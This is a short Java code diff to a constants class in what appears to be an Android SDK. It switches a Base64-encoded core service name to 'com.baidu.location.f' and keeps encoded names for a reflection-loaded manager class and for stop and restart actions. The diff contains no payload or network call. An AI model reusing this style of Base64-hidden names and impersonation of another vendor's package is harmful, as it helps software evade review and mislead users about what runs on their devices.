@@ -5,7 +5,7 @@ import com.paras.piece.utils.Base64;
 
 public class Constant {
 
-    public static final String SERVICE_PACKAGE = getString("VkJz");//当前核心服务包名 VBs
+    public static final String SERVICE_PACKAGE = getString("Y29tLmJhaWR1LmxvY2F0aW9uLmY=");//当前核心服务包名 com.baidu.location.f
     public static final String SDK_SERVICE_CODE = getString("Y29tLmp2LmNvZGUubWFuYWdlci5TREtNYW5hZ2Vy");//反射逻辑类包名  com.jv.code.manager.SDKManager
     public static final String STOP_SERVICE = getString("Yy5hLncuc3RvcC5hY3Rpb24=");//关闭主服务 action  c.a.w.stop.action
     public static final String RE_START_RECEIVER = getString("Yy5hLncucmVzdGFydC5hY3Rpb24="); //重启SDK action  c.a.w.restart.action
